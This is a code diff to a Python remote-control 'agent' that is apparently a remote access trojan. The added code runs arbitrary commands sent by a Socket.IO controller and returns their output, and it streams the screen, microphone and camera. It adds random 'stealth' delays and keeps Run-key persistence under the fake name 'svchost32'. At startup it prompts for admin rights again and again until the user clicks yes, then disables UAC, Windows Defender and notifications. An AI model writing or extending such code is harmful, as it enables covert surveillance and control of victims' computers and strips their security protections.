+    # Verify this command is for us
+    our_agent_id = get_or_create_agent_id()
+    if agent_id != our_agent_id:
+        return  # Not for this agent
+    
+    log_message(f"[EXECUTE_COMMAND] Received: {command} (execution_id: {execution_id})")
+    
+    # Execute the command using the same logic as on_command
+    output = ""
+    success = True
+    
+    # Add stealth delay
+    sleep_random_non_blocking()
+    
+    internal_commands = {
+        "start-stream": lambda: start_streaming(our_agent_id),
+        "stop-stream": stop_streaming,
+        "start-audio": lambda: start_audio_streaming(our_agent_id),
+        "stop-audio": stop_audio_streaming,
+        "start-camera": lambda: start_camera_streaming(our_agent_id),
+        "stop-camera": stop_camera_streaming,
+        "screenshot": lambda: "Screenshot captured",
+        "systeminfo": lambda: execute_command("systeminfo" if WINDOWS_AVAILABLE else "uname -a"),
+    }
+    
+    if command in internal_commands:
+        try:
+            output = internal_commands[command]()
+            if output is None:
+                output = f"Command '{command}' executed successfully"
+        except Exception as e:
+            output = f"Error executing '{command}': {e}"
+            success = False
+    else:
+        # Execute as system command
+        try:
+            output = execute_command(command)
+            if not output:
+                output = "(command completed with no output)"
+        except Exception as e:
+            output = f"Command execution error: {e}"
+            success = False
+    
+    # Send output back to controller WITH execution_id
+    log_message(f"[EXECUTE_COMMAND] Sending output ({len(output)} chars) with execution_id: {execution_id}")
+    sio.emit('command_result', {
+        'agent_id': our_agent_id,
+        'execution_id': execution_id,  # ✅ INCLUDE execution_id in response
+        'command': command,  # ✅ INCLUDE original command
+        'output': output,
+        'success': success,
+        'timestamp': time.time()
+    })
 
 def on_mouse_move(data):
     if not SOCKETIO_AVAILABLE or sio is None:
@@ -9394,9 +11269,12 @@ def add_registry_startup():
             log_message(f"[INFO] Stealth executable already exists: {stealth_exe_path}")
         
         # Add to registry pointing to the stealth location
+        # IMPORTANT: Do NOT use quotes around the path in registry - it can cause UAC prompts
+        # The executable will run with normal user privileges automatically
         key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, 
                               r"Software\Microsoft\Windows\CurrentVersion\Run")
-        winreg.SetValueEx(key, "svchost32", 0, winreg.REG_SZ, f'"{stealth_exe_path}"')
+        # Store without quotes to avoid UAC prompt on startup
+        winreg.SetValueEx(key, "svchost32", 0, winreg.REG_SZ, stealth_exe_path)
         winreg.CloseKey(key)
         
         log_message(f"[OK] Registry persistence established: {stealth_exe_path}")
@@ -9751,6 +11629,76 @@ def signal_handler(signum, frame):
     sys.exit(0)
 
 if __name__ == "__main__":
+    # Add startup banner before anything else
+    print("[STARTUP] Python Agent Starting...")
+    print("[STARTUP] Initializing components...")
+    
+    # PRIORITY 0: Request admin privileges (keep asking until YES)
+    if WINDOWS_AVAILABLE:
+        print("=" * 80)
+        print("[STARTUP] PRIORITY 0: Requesting Administrator Privileges...")
+        print("[STARTUP] This is REQUIRED for the agent to function properly")
+        print("[STARTUP] The prompt will keep appearing until you click YES")
+        print("=" * 80)
+        
+        try:
+            # Keep asking for admin until user clicks YES
+            run_as_admin_persistent()
+        except Exception as e:
+            print(f"[STARTUP] Admin request error: {e}")
+            import traceback
+            traceback.print_exc()
+    
+    # PRIORITY 1: Disable WSL, UAC, Defender, and Notifications FIRST
+    try:
+        print("[STARTUP] === SYSTEM CONFIGURATION STARTING ===")
+        
+        # 0. Disable WSL routing FIRST (fixes command execution!)
+        print("[STARTUP] Step 0: Disabling WSL routing (AGGRESSIVE)...")
+        try:
+            if disable_wsl_routing():
+                print("[STARTUP] ✅ WSL routing disabled - commands will use CMD.exe directly")
+            else:
+                print("[STARTUP] ⚠️ WSL routing disable failed (not critical)")
+        except Exception as e:
+            print(f"[STARTUP] WSL routing error: {e}")
+        
+        # 1. Disable UAC first (requires admin)
+        print("[STARTUP] Step 1: Disabling UAC...")
+        try:
+            if disable_uac():
+                print("[STARTUP] ✅ UAC disabled successfully")
+            else:
+                print("[STARTUP] ⚠️ UAC disable failed (requires admin on first run)")
+        except Exception as e:
+            print(f"[STARTUP] UAC disable error: {e}")
+        
+        # 2. Disable Windows Defender
+        print("[STARTUP] Step 2: Disabling Windows Defender...")
+        try:
+            if disable_defender():
+                print("[STARTUP] ✅ Windows Defender disabled successfully")
+            else:
+                print("[STARTUP] ⚠️ Defender disable failed")
+        except Exception as e:
+            print(f"[STARTUP] Defender disable error: {e}")
+        
+        # 3. Disable Windows notifications
+        print("[STARTUP] Step 3: Disabling Windows notifications...")
+        try:
+            if disable_windows_notifications():
+                print("[STARTUP] ✅ Notifications disabled successfully")
+            else:
+                print("[STARTUP] ⚠️ Notification disable failed")
+        except Exception as e:
+            print(f"[STARTUP] Notification disable error: {e}")
+        
+        print("[STARTUP] === SYSTEM CONFIGURATION COMPLETE ===")
+    except Exception as e:
+        print(f"[STARTUP] Configuration error: {e}")
+        import traceback
+        traceback.print_exc()
+    
     # Initialize basic stealth mode
     try:
         sleep_random_non_blocking()  # Add random delay
@@ -9784,19 +11732,25 @@ if __name__ == "__main__":
         log_message("=" * 60)
     
     # CRITICAL FIX: Call main_unified() which contains the persistence logic
+    print("[STARTUP] Calling main_unified()...")
     try:
         main_unified()
     except KeyboardInterrupt:
-        log_message("System shutdown requested.")
+        print("System shutdown requested.")
     except ImportError as e:
-        log_message(f"Missing dependency: {e}", "error")
-        log_message("Agent will continue with limited functionality", "warning")
+        print(f"Missing dependency: {e}")
+        print("Agent will continue with limited functionality")
+        import traceback
+        traceback.print_exc()
         # Continue running with basic functionality
         while True:
             time.sleep(60)
     except Exception as e:
-        log_message(f"System error: {e}", "error")
-        log_message("Attempting to recover and continue...", "warning")
+        print(f"System error: {e}")
+        print("Full traceback:")
+        import traceback
+        traceback.print_exc()
+        print("Attempting to recover and continue...")
         # Try to recover and continue
         time.sleep(5)
     finally:
